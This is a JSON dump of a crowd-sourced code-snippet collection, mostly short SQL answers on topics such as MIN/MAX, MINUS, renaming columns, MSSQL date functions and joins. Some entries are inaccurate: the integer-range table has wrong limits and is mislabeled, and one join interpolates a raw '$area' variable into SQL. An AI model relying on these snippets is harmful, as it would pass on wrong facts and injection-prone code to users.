    "description": "/* Answer to: \"microsoft sql server\" */  /*   Microsoft SQL Server is a relational database management   system developed by Microsoft. As a database server, it is a   software product with the primary function of storing and   retrieving data as requested by other software   applications&mdash;which may run either on the same computer or on   another computer across a network. */\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1826,
    "keyword": null,
    "link": null,
    "title": " migrate sql table another database",
    "description": "INSERT INTO dbo.YourTableNameHere    SELECT *    FROM [SourceServer].[SourceDatabase].dbo.YourTableNameHere\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1827,
    "keyword": null,
    "link": null,
    "title": " min and max salary and name in sql",
    "description": "SELECT FIRST_NAME , SALARY FROM EMPLOYEES WHERE SALARY IN (SELECT MAX(SALARY)AS RESULT FROM EMPLOYEES UNION SELECT MIN(SALARY)AS RESULT FROM EMPLOYEES);\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1828,
    "keyword": null,
    "link": null,
    "title": " min max sql",
    "description": "SELECT MIN(salary), MAX(salary) FROM employees; SELECT team, MIN(salary), MAX(salary) FROM employees GROUP BY team;\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1829,
    "keyword": null,
    "link": null,
    "title": " min max sql group by",
    "description": "SELECT MIN(salary), MAX(salary) FROM employees; SELECT team, MIN(salary), MAX(salary) FROM employees GROUP BY team;\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1830,
    "keyword": null,
    "link": null,
    "title": " min plsql",
    "description": "--in query use MIN  SELECT MIN(something) FROM some_table;  --in statements use LEAST  (watch out, if there is a null it will return null) local_variable := LEAST('2', '5', '12', '3');  --Here some examples LEAST('2', '5', '12', '3') Result: '12'  LEAST(2, 5, 12, 3) Result: 2  LEAST('apples', 'applis', 'applas') Result: 'applas'  LEAST('apples', 'applis', 'applas', null) Result: NULL\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1831,
    "keyword": null,
    "link": null,
    "title": " min salary in sql",
    "description": "SELECT first_name, last_name, salary, job_id FROM employees WHERE salary = (SELECT MIN(salary) FROM employees); \n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1832,
    "keyword": null,
    "link": null,
    "title": " minecraft forge server host",
    "description": "Top Free Providers: Aternos provides 2 free 2gb RAM servers  Best Cheap Provider: Jeekie.Host is one of the cheapest hosting companies in the industry with prices starting at &euro;0.60/gb. - https://jeekie.host/\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1833,
    "keyword": null,
    "link": null,
    "title": " minecraft java port number",
    "description": "sudo fuser -k 8000/tcp\nUSE master GO xp_readerrorlog 0, 1, N'Server is listening on'  GO  #LogDate\tProcessInfo\tText #...\t\tServer\t\tServer is listening on [ ::1 <ipv6> 1434]. #2..\t\tServer\t\tServer is listening on [ 127.0.0.1 <ipv4> 1434].\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1834,
    "keyword": null,
    "link": null,
    "title": " minus equivalent in my sql",
    "description": "select column_name from table1 where some_column not in (select column_name from table2)\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1835,
    "keyword": null,
    "link": null,
    "title": " minus in sql",
    "description": "The SQL MINUS operator is used to return  all rows in the first SELECT statement that are not returned by the second SELECT statement. Each SELECT statement will define a dataset.  ]The MINUS operator will retrieve all records from the first dataset and then remove from the results all records from the second dataset.\n UPDATE Inventory    SET Quantity = Quantity - 1  WHERE InventoryID = 2 \n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1836,
    "keyword": null,
    "link": null,
    "title": " minus oracle exemple",
    "description": "(SELECT * FROM T1 MINUS SELECT * FROM T2)   -- Rows that are in T1 but not in T2 UNION ALL (SELECT * FROM T2 MINUS SELECT * FROM T1);  -- Rows that are in T2 but not in T1\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1837,
    "keyword": null,
    "link": null,
    "title": " minus vs intersect in sql",
    "description": "MINUS (returns records from 1 query that are not present in 2 query) &bull; INTERSECT (returns only common for both queries data)\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1838,
    "keyword": null,
    "link": null,
    "title": " missing from-clause entry for table",
    "description": "SELECT     AcId, AcName, PldepPer, RepId, CustCatg, HardCode, BlockCust, CrPeriod, CrLimit,     BillLimit, Mode, PNotes, gtab82.memno  FROM    VCustomer AS v1 INNER JOIN       gtab82 ON gtab82.memacid = v1.AcId  WHERE (AcGrCode = '204' OR CreDebt = 'True')  AND Masked = 'false' ORDER BY AcName\n",
    "reg_date": "2021-10-12T09:56:41.000Z"
  },
  {
    "id": 1839,
    "keyword": null,
    "link": null,
    "title": " mit licence generator",
    "description": "MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1840,
    "keyword": null,
    "link": null,
    "title": " mit license",
    "description": "MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\nCopyright <YEAR> <COPYRIGHT HOLDER>  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in  the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  SOFTWARE.\nCopyright <YEAR> <COPYRIGHT HOLDER>  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\nMIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. \njust use an ide lmao\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1841,
    "keyword": null,
    "link": null,
    "title": " mode in sql",
    "description": "SELECT TOP 1 Column_Name FROM   Table_name GROUP  BY [Column_Name] ORDER  BY COUNT(*) DESC \n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1842,
    "keyword": null,
    "link": null,
    "title": " modificar tipo de dato sql server",
    "description": "ALTER TABLE tabla ALTER COLUMN campo tipodedato\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1843,
    "keyword": null,
    "link": null,
    "title": " modifier une valeur sql",
    "description": "UPDATE table SET nom_colonne_1 = 'nouvelle valeur' WHERE condition\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1844,
    "keyword": null,
    "link": null,
    "title": " modify column name in mysql",
    "description": "ALTER TABLE `members` CHANGE COLUMN `full_names` `fullname` varchar(100) NOT NULL;\nALTER TABLE your_table_name RENAME COLUMN original_column_name TO new_column_name;\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length); (you can remove the backticks if it doesn't work)\nALTER TABLE tableName CHANGE `oldcolname` `newcolname` datatype(length);\nALTER TABLE `members` ADD COLUMN `credit_card_number` VARCHAR(25);\nALTER TABLE table_name CHANGE old_column_name new_column_name datatype(length);\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1845,
    "keyword": null,
    "link": null,
    "title": " modify column name in sql",
    "description": "EXEC SP_RENAME 'TABLE_NAME.OLD_COLUMN_NAME','NEW_COLUMN_NAME'\n-- Oracle, MySQL 8+ ALTER TABLE table_name RENAME COLUMN current_name TO new_name; -- MySQL < 8: ALTER TABLE table_name CHANGE current_name new_name datatype(length); -- SQL Server: EXEC SP_RENAME 'table_name.current_name' , 'new_name', 'COLUMN'\nEXEC sp_RENAME 'table_name.old_name', 'new_name', 'COLUMN' \nALTER TABLE table_name RENAME COLUMN old_name TO new_name;\nALTER TABLE table_name CHANGE COLUMN old_name TO new_name; \nALTER TABLE `Table Name` MODIFY COLUMN `Column Name` Datatype(Size);\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1846,
    "keyword": null,
    "link": null,
    "title": " monetary type mysql",
    "description": "decimal(15,2)\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1847,
    "keyword": null,
    "link": null,
    "title": " mongodb vs mysql",
    "description": "''' MySQL is a relational database management system (RDBMS) from the  Oracle Corporation. Like other relational systems, MySQL stores data  in tables and uses structured query language (SQL) for database  access. When MySQL developers need to access data in an application,  they merge data from multiple tables together in a process called a  join. In MySQL, you predefine your database schema and set up rules  to govern the relationships between fields in your tables.  MongoDB is a NoSQL database that stores data as JSON-like documents.  Documents store related information together and use the MongoDB  query language (MQL) for access. Fields can vary from document to  document - there is no need to declare the structure of documents to  the system, as documents are self-describing. Optionally, schema  validation can be used to enforce data governance controls over each  collection. '''\n/* Answer to: \"\" */  /*   MongoDB is a NoSQL database that is more advanced and capable of   handling more data. SQL Server is a database management system   that is used to manage the relational database system. */\nName\tDescription $eq\t\tMatches values that are equal to a specified value. $gt\t\tMatches values that are greater than a specified value. $gte\tMatches values that are greater than or equal to a specified value. $in\t\tMatches any of the values specified in an array. $lt\t\tMatches values that are less than a specified value. $lte\tMatches values that are less than or equal to a specified value. $ne\t\tMatches all values that are not equal to a specified value. $nin\tMatches none of the values specified in an array.\n",
    "reg_date": "2021-10-12T09:56:42.000Z"
  },
  {
    "id": 1848,
    "keyword": null,
    "link": null,
    "title": " mongodb vs sql",
    "description": "''' MySQL is a relational database management system (RDBMS) from the  Oracle Corporation. Like other relational systems, MySQL stores data  in tables and uses structured query language (SQL) for database  access. When MySQL developers need to access data in an application,  they merge data from multiple tables together in a process called a  join. In MySQL, you predefine your database schema and set up rules  to govern the relationships between fields in your tables.  MongoDB is a NoSQL database that stores data as JSON-like documents.  Documents store related information together and use the MongoDB  query language (MQL) for access. Fields can vary from document to  document - there is no need to declare the structure of documents to  the system, as documents are self-describing. Optionally, schema  validation can be used to enforce data governance controls over each  collection. '''\n/* Answer to: \"\" */  /*   MongoDB is a NoSQL database that is more advanced and capable of   handling more data. SQL Server is a database management system   that is used to manage the relational database system. */\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1849,
    "keyword": null,
    "link": null,
    "title": " month mysql",
    "description": "SELECT MONTH(\"2017-06-15\");\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1850,
    "keyword": null,
    "link": null,
    "title": " monthname sql",
    "description": "SELECT DATENAME(mm,GETDATE())[Month Name]\nSELECT GETDATE() 'Today', FORMAT(GETDATE(),'MMMM') 'Month Name' \n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1851,
    "keyword": null,
    "link": null,
    "title": " moodle query first user access",
    "description": "select firstaccess from mdl_user;\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1852,
    "keyword": null,
    "link": null,
    "title": " mql5 datetime get hour",
    "description": "void OnStart()   {       MqlDateTime dt_struct;        dt_struct.hour;       }\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1853,
    "keyword": null,
    "link": null,
    "title": " mql5 split string",
    "description": "string to_split=\"_life_is_good_\"; // A string to split into substrings    string sep=\"_\";                // A separator as a character    ushort u_sep;                  // The code of the separator character    string result[];               // An array to get strings    //--- Get the separator code    u_sep=StringGetCharacter(sep,0);    //--- Split the string to substrings    int k=StringSplit(to_split,u_sep,result);    //--- Show a comment     PrintFormat(\"Strings obtained: %d. Used separator '%s' with the code %d\",k,sep,u_sep);\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1854,
    "keyword": null,
    "link": null,
    "title": " ms sql database data size",
    "description": "SELECT DB_NAME(database_id) AS DatabaseName,        Name AS Logical_Name,        Physical_Name,        (size * 8) / 1024 SizeMB FROM sys.master_files WHERE DB_NAME(database_id) = 'MY_DB' \n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1855,
    "keyword": null,
    "link": null,
    "title": " ms sql how to see active job current run time",
    "description": "SELECT     ja.job_id,     j.name AS job_name,     ja.start_execution_date,           ISNULL(last_executed_step_id,0)+1 AS current_executed_step_id,     Js.step_name FROM msdb.dbo.sysjobactivity ja  LEFT JOIN msdb.dbo.sysjobhistory jh      ON ja.job_history_id = jh.instance_id JOIN msdb.dbo.sysjobs j  ON ja.job_id = j.job_id JOIN msdb.dbo.sysjobsteps js     ON ja.job_id = js.job_id     AND ISNULL(ja.last_executed_step_id,0)+1 = js.step_id WHERE ja.session_id = (SELECT TOP 1 session_id FROM msdb.dbo.syssessions ORDER BY agent_start_date DESC) AND start_execution_date is not null AND stop_execution_date is null; \n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1856,
    "keyword": null,
    "link": null,
    "title": " ms sql left join select",
    "description": "SELECT * FROM  (SELECT [column] FROM [table]) a LEFT JOIN (SELECT [column1], [columnn2] FROM [table]) b ON a.column = b.column1\nSELECT * FROM  (SELECT [UserID] FROM [User]) a LEFT JOIN (SELECT [TailUser], [Weight] FROM [Edge] WHERE [HeadUser] = 5043) b ON a.UserId = b.TailUser\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1857,
    "keyword": null,
    "link": null,
    "title": " ms sql mac",
    "description": "alias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \nsudo docker pull mcr.microsoft.com/mssql/server:2019-latest \nselect @@version \n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1858,
    "keyword": null,
    "link": null,
    "title": " ms sql print from new line",
    "description": "\t-- CHAR(10) makes new line in windows     PRINT 'line 1' + CHAR(10) + 'line 2'\n",
    "reg_date": "2021-10-12T09:56:43.000Z"
  },
  {
    "id": 1859,
    "keyword": null,
    "link": null,
    "title": " ms sql print more than 1 variable",
    "description": "declare @first INT = 1, @second int = 2 PRINT '1st var ' + CAST(@first AS VARCHAR) + ' 2nd var ' + CAST(@second AS VARCHAR)\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1860,
    "keyword": null,
    "link": null,
    "title": " ms sql row number over partition",
    "description": "USE AdventureWorks2012;   GO   SELECT FirstName, LastName, TerritoryName, ROUND(SalesYTD,2,1) AS SalesYTD,   ROW_NUMBER() OVER(PARTITION BY TerritoryName ORDER BY SalesYTD DESC)    AS Row   FROM Sales.vSalesPerson   WHERE TerritoryName IS NOT NULL AND SalesYTD <> 0   ORDER BY TerritoryName;   \n-- Uses AdventureWorks      SELECT ROW_NUMBER() OVER(ORDER BY SUM(SalesAmountQuota) DESC)      AS RowNumber,       FirstName, LastName,        CONVERT(varchar(13), SUM(SalesAmountQuota),1) AS SalesQuota    FROM dbo.DimEmployee AS e   INNER JOIN dbo.FactSalesQuota AS sq       ON e.EmployeeKey = sq.EmployeeKey   WHERE e.SalesPersonFlag = 1   GROUP BY LastName, FirstName;   \n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1861,
    "keyword": null,
    "link": null,
    "title": " ms sql select datetime as date",
    "description": "select cast(started_datetime as date) from table;\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1862,
    "keyword": null,
    "link": null,
    "title": " ms sql server stored procedure output parameter",
    "description": "                                     CREATE PROCEDURE uspFindProductByModel (     @model_year SMALLINT,     @product_count INT OUTPUT ) AS BEGIN     SELECT          product_name,         list_price     FROM         production.products     WHERE         model_year = @model_year;      SELECT @product_count = @@ROWCOUNT; END; \nCopy CodeCREATE PROCEDURE spGetEmployeeCountByGender @Gender nvarchar(20), @EmployeeCount int Output AS BEGIN SELECT @EmployeeCount = COUNT(Id)  FROM tblEmployee  WHERE Gender = @Gender END\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1863,
    "keyword": null,
    "link": null,
    "title": " ms sql skip take",
    "description": "SELECT col1, col2, ...  FROM ...  WHERE ...   ORDER BY -- this is a MUST there must be ORDER BY statement -- the paging comes here OFFSET     10 ROWS       -- skip 10 rows FETCH NEXT 10 ROWS ONLY; -- take 10 rows\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1864,
    "keyword": null,
    "link": null,
    "title": " ms sql truncate table vs delete",
    "description": "-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With possible rollback DELETE FROM my_table; COMMIT;  -- or ROLLBACK;\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1865,
    "keyword": null,
    "link": null,
    "title": " mssql check if date is greater than today",
    "description": "WHERE YourDateValue >= DATEADD(MONTH, 1, GETDATE())\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1866,
    "keyword": null,
    "link": null,
    "title": " mssql current date",
    "description": "GETDATE() \nSELECT CAST( GETDATE() AS Date ) ;\nGETDATE()\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1867,
    "keyword": null,
    "link": null,
    "title": " mssql describe stored procedure sqlcmd",
    "description": "sp_helptext <name of your sp>\n",
    "reg_date": "2021-10-12T09:56:44.000Z"
  },
  {
    "id": 1868,
    "keyword": null,
    "link": null,
    "title": " mssql disable foreign key constraint",
    "description": "If you want to disable all constraints in the database just run this code:  -- disable all constraints EXEC sp_MSforeachtable \"ALTER TABLE ? NOCHECK CONSTRAINT all\" To switch them back on, run: (the print is optional of course and it is just listing the tables)  -- enable all constraints exec sp_MSforeachtable @command1=\"print '?'\", @command2=\"ALTER TABLE ? WITH CHECK CHECK CONSTRAINT all\" I find it useful when populating data from one database to another. It is much better approach than dropping constraints. As you mentioned it comes handy when dropping all the data in the database and repopulating it (say in test environment).  If you are deleting all the data you may find this solution to be helpful.  Also sometimes it is handy to disable all triggers as well, you can see the complete solution here.\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1869,
    "keyword": null,
    "link": null,
    "title": " mssql find deadlocks",
    "description": "--[status] EXEC sp_whoisActive;\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1870,
    "keyword": null,
    "link": null,
    "title": " mssql get all table names",
    "description": "SELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT name from sysobjects where type = 'U'\nBY LOVE SINGH  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nGet table containing given field\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1871,
    "keyword": null,
    "link": null,
    "title": " mssql int max value",
    "description": "--\t\t\tSIGNED\t\t\t\t\t\t\t\t\t\t  UNSIGNED --\t\t\tMin               \t\tMax                   Min Max TINYINT     -128                    127                   0   255 SMALLINT    -32767                  32767                 0   65535 MEDIUMINT   -8388608                388608                0   16777215 INT         -2147483648             2147483647            0   4294967295 INTEGER     -2147483648             2147483647            0   4294967295 BIGINT      -9223372036854775808    9223372036854775808   0   18446744073709551615\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1872,
    "keyword": null,
    "link": null,
    "title": " mssql last day of month",
    "description": "SELECT DATEADD(month, ((YEAR(getdate()) - 1900) * 12) + MONTH(getdate()), -1)\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1873,
    "keyword": null,
    "link": null,
    "title": " mssql list table rows",
    "description": "SELECT       QUOTENAME(SCHEMA_NAME(sOBJ.schema_id)) + '.' + QUOTENAME(sOBJ.name) AS [TableName]       , SUM(sPTN.Rows) AS [RowCount] FROM        sys.objects AS sOBJ       INNER JOIN sys.partitions AS sPTN             ON sOBJ.object_id = sPTN.object_id WHERE       sOBJ.type = 'U'       AND sOBJ.is_ms_shipped = 0x0       AND index_id < 2 -- 0:Heap, 1:Clustered GROUP BY        sOBJ.schema_id       , sOBJ.name ORDER BY 2 desc GO\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1874,
    "keyword": null,
    "link": null,
    "title": " mssql now diff 90 day",
    "description": "Where YourDate >= (GetDate() - 90)\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1875,
    "keyword": null,
    "link": null,
    "title": " mssql remove column",
    "description": "                                     ALTER TABLE table_name DROP COLUMN column_name; \n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1876,
    "keyword": null,
    "link": null,
    "title": " mssql string length",
    "description": "SELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\n-- Relevant for SQL-Oracle only  -- syntax LENGTH(<your-string>)  -- example LENGTH('CountCharacters') -- OUTPUT: 15         123456789012345  -- example with query  SELECT 'CountCharacters',LENGTH('CountCharacters') FROM DUAL;  -- OUTPUT: CountCharacters, 15\n",
    "reg_date": "2021-10-12T09:56:45.000Z"
  },
  {
    "id": 1877,
    "keyword": null,
    "link": null,
    "title": " mssql studio powershell",
    "description": "SQLSERVER:\\SQL\\MyComputer\\MyInstance\\Databases\\AdventureWorks2012>   \n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1878,
    "keyword": null,
    "link": null,
    "title": " mssql subqueries",
    "description": "USE AdventureWorks2016; GO SELECT Ord.SalesOrderID, Ord.OrderDate,     (SELECT MAX(OrdDet.UnitPrice)      FROM Sales.SalesOrderDetail AS OrdDet      WHERE Ord.SalesOrderID = OrdDet.SalesOrderID) AS MaxUnitPrice FROM Sales.SalesOrderHeader AS Ord; GO\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1879,
    "keyword": null,
    "link": null,
    "title": " mssql trigger examples",
    "description": "CREATE TRIGGER trigger_name    ON { Table name or view name }    [ WITH <Options> ]   { FOR | AFTER | INSTEAD OF }    { [INSERT], [UPDATE] , [DELETE] }\t\t\t\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1880,
    "keyword": null,
    "link": null,
    "title": " multi row functions in sql",
    "description": "--- GROUP FUNCTION | MULTI ROW FUNCTION | AGGREGATE FUNCTION  --- COUNT , MAX , MIN , SUM , AVG\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1881,
    "keyword": null,
    "link": null,
    "title": " multiple count in sql",
    "description": "SELECT distributor_id,     count(*) AS Total,     sum(CASE WHEN inflevel = 'exec' THEN 1 ELSE 0 END) AS ExecCount,     sum(CASE WHEN inflevel = 'personal' THEN 1 ELSE 0 END) AS PersonalCount FROM yourtable GROUP BY distributor_id\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1882,
    "keyword": null,
    "link": null,
    "title": " multiple foreign key sql",
    "description": "CREATE TABLE table1 (   column1 int NOT NULL,   column2 int NOT NULL,   FOREIGN KEY(column1) REFERENCES table2(column3),   FOREIGN KEY(column2) REFERENCES table3(column4) );\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1883,
    "keyword": null,
    "link": null,
    "title": " multiple joins mysql",
    "description": "SELECT dashboard_data.headline, dashboard_data.message, dashboard_messages.image_id, images.filename FROM dashboard_data      INNER JOIN dashboard_messages          ON dashboard_message_id = dashboard_messages.id     INNER JOIN images         ON dashboard_messages.image_id = images.image_id \nSELECT areas.name AS aname, COUNT(consultants.active) AS cct      FROM areas      LEFT JOIN consAreas        ON consAreas.area = areas.id      LEFT JOIN consultants        ON consultants.id = consAreas.cons    WHERE areas.areaID = $area       AND consultants.active = 1 GROUP BY areas.name ORDER BY areas.name \nSELECT      t1.name name,     t1.id id,     t1.add_date add_date,      t2.soc_township township_name1,     t2.soc_name soc_name,     t3.name township_name FROM block t1  INNER JOIN society t2     ON (t1.soc_id = t2.id) INNER JOIN township t3     ON (t2.soc_township = t3.id)\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1884,
    "keyword": null,
    "link": null,
    "title": " multiple like in sql",
    "description": "SELECT * FROM my_table WHERE (colA LIKE '%hello%' OR colB LIKE '%world%');\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1885,
    "keyword": null,
    "link": null,
    "title": " multiple order by sql",
    "description": "SELECT * FROM People ORDER BY FirstName DESC, YearOfBirth ASC \nThe following shows that you can perform order by with more than one column. 'ASC' denotes ascending sort order, but is optional as it is the default sort order. 'DESC' denotes descending sort order  SELECT Id, CompanyName, City, Country   FROM Supplier  WHERE Country IN ('USA', 'Japan', 'Germany')  ORDER BY Country ASC, CompanyName DESC\nSELECT * FROM table_name ORDER BY col1 ASC;\t\t\t\t-- ASCending is default SELECT * FROM table_name ORDER BY col1 DESC;\t\t\t-- DESCending SELECT * FROM table_name ORDER BY col1 DESC, col2;\t\t-- col1 DESC then col2 ASC\nORDER BY column1 DESC, column2\nSort by multiple column : ORDER BY column1 DESC, column2\nORDER BY column1 DESC, column2 \n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1886,
    "keyword": null,
    "link": null,
    "title": " multiple replace value mssql",
